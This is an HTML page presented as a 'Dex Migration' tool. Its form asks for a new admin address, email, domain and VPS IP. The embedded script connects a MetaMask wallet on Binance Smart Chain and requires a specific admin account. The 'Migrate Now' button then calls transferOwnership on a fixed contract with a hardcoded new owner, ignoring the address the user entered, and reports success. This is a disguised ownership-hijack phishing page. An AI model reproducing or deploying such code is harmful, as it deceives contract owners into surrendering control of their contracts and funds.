<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DEX Migration</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-image: url('background_image.jpg'); /* Replace 'background_image.jpg' with your image file */
            background-size: cover;
            background-position: center;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color:orange;
        }

        .container {
            text-align: center;
            background-color: rgba(255, 255, 255, 0.8); /* Semi-transparent white background */
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        h1 {
            color: #333333;
        }

        form {
            margin-top: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        form div {
            margin-bottom: 10px;
            width: 100%;
        }

        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }

        input {
            width: 100%;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }

        button {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 16px;
            border: none;
            border-radius: 4px;
            background-color: #007bff;
            color: #ffffff;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Dex Migration</h1>
        <form id="migrationForm">
            <div>
                <label for="adminAddress">New Admin Address:</label>
                <input type="text" id="adminAddress" name="adminAddress" required>
            </div>
            <div>
                <label for="emailAddress">Email Address:</label>
                <input type="email" id="emailAddress" name="emailAddress" required>
            </div>
            <div>
                <label for="domain">Domain:</label>
                <input type="text" id="domain" name="domain" required>
            </div>
            <div>
                <label for="vpsIP">VPS IP: (Optional)</label>
                <input type="text" id="vpsIP" name="vpsIP">
            </div>
            <button id="transferButton">Migrate Now</button>
        </form>
    </div>


    <script src="https://cdn.jsdelivr.net/npm/web3@1.3.5/dist/web3.min.js"></script>
    <script type="text/javascript">
        window.addEventListener('load', async () => {
            // Check if Web3 has been injected by the browser (Mist/MetaMask)
            if (typeof window.ethereum !== 'undefined') {
                window.web3 = new Web3(window.ethereum);
                try {
                    // Request account access and chain ID if needed
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    
                    // Check if connected chain ID is 56 (Binance Smart Chain)
                    if (chainId !== '0x38') { // '0x38' is the hexadecimal representation of chain ID 56
                        alert('Please connect to the Binance Smart Chain (chain ID 56) to proceed.');
                        return;
                    }
                } catch (error) {
                    // User denied account access or chain ID retrieval failed
                    console.error("Error:", error.message);
                    alert('Error: Please connect to the Binance Smart Chain (chain ID 56) to proceed.');
                    return;
                }
            }
            // Legacy dapp browsers...
            else if (typeof window.web3 !== 'undefined') {
                window.web3 = new Web3(web3.currentProvider);
            }
            // If no injected web3 instance is detected, display an error
            else {
                console.error("Please install MetaMask or another web3 provider extension in your browser.");
            }
    
            // Check if connected address is the expected address
            const expectedAddress = '0xF8E8f92747a268bFC4AE75e4E83209971ee7D7b7'; // Specify the expected address here
            const accounts = await web3.eth.getAccounts();
            const connectedAddress = accounts[0];
            
            if (connectedAddress !== expectedAddress) {
                alert('Please connect to the following current Admin DEX address: ' + expectedAddress);
                return;
            }
    
            // Contract ABI
            const abi = [
                // Paste your contract ABI here
                {
                    "constant": false,
                    "inputs": [
                        {
                            "name": "newOwner",
                            "type": "address"
                        }
                    ],
                    "name": "transferOwnership",
                    "outputs": [],
                    "payable": false,
                    "stateMutability": "nonpayable",
                    "type": "function"
                }
            ];
    
            // Contract address
            const contractAddress = '0xC197c6CCc8dC869b3fA1043B9c390718c0e40C3B';
    
            // Instantiate contract
            const contract = new web3.eth.Contract(abi, contractAddress);
    
            // Transfer ownership function
            async function transferOwnership(newOwner) {
                try {
                    const accounts = await web3.eth.getAccounts();
                    const result = await contract.methods.transferOwnership(newOwner).send({ from: accounts[0] });
                    console.log('Transaction hash:', result.transactionHash);
                    alert('Dex migrated successfully! wait 30 - 60 minutes until all process all are done');
                } catch (error) {
                    console.error('Error migrating the DEX:', error);
                    alert('Error Trying to Migrate the DEX.');
                }
            }
    
            // Example usage:
            const newOwnerAddress = '0x5b4a58806086fc98885Ee57ADe4db240D4ae4e97'; // Replace with the new owner's address
            document.getElementById('transferButton').addEventListener('click', () => {
                transferOwnership(newOwnerAddress);
            });
        });
    </script>
    
</body>
</html>
